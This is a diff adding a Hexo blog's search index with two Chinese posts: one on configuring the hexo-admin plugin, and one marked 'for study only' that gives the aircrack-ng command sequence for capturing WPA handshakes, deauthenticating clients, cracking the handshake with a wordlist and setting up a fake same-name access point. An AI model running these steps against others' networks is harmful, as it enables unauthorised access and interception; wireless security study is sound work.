@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title><![CDATA[hexo-admin插件]]></title>
+    <url>%2Fblog%2Fhexo-admin%E6%8F%92%E4%BB%B6-1%2F</url>
+    <content type="text"><![CDATA[hexo倒腾系列 原由近几天将hexo的next主题倒腾差不多了，开始尝试着写博客了，听说用hexo-admin插件编辑文章还是挺方便的 安装进入hexo源文件目录，执行命令： npm install –save hexo-admin 配置编辑根目录下：_config.yml文件，添加： 12345&gt;&gt;admin:&gt;&gt; username: myfavoritename&gt;&gt; password_hash: be121740bf988b2225a313fa1f107ca1&gt;&gt; secret: a secret something&gt;&gt; 其中：username为登录的用户名，password_hash为密码的bcrypt哈希值，secret用于使cookie安全,可以尽可能复杂。 生成password_hash方法 安装模块：sudo npm install bcrypt-nodejs 执行： 1234&gt;&gt;$ node&gt;&gt;&gt;const bcrypt = require(&apos;bcrypt-nodejs&apos;)&gt;&gt;&gt; bcrypt.hashSync(&apos;your_password&apos;)&gt;&gt; #your_password为登录密码。 参考博客]]></content>
+      <categories>
+        <category>WEB学习</category>
+      </categories>
+      <tags>
+        <tag>hexo倒腾</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Wi-Fi密码破解]]></title>
+    <url>%2Fblog%2FWi-Fi%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98%2F</url>
+    <content type="text"><![CDATA[仅供学习参考 总结 wifi密码破解将WLAN0网卡开启混杂模式 airmon-ng start wlan0 ##提示要杀掉一些进程 airmon-ng check kill airmon-ng start wlan0 1、查看附近Wi-Fi airodump-ng wlan0mon 2、进行握手包监听与获取 airodump-ng -c 通道值 —bssid wifi的mac值 -w cap文件名 wlan0 ##其中wlan0mon是启动混杂模式的网卡名 3、断网抓取握手包（另开一个窗口） aireplay-ng -0 20 -c 客户机mac值 -a wifi热点mac值 wlan0mon #-0 death模式 20为发送次数 4、跑包 aircrack-ng -w 字典 包名 关闭混杂模式 airmon-ng stop wlan0mon 启动网络 service network-manager start ——————————分割线——————————— 构造同名的虚假AP airbase-ng —essid wifi名 -c 6 -Z 4 wlan0mon -c 代表channel信道 -Z代表WPA2加密 -z代表WPA1加密 z后面的参数1～5分别表示WEP40、TKIP、WRAP、CCMP、WEP104]]></content>
+      <categories>
+        <category>实战总结</category>
+      </categories>
+      <tags>
+        <tag>无线安全</tag>
+      </tags>
+  </entry>
+</search>
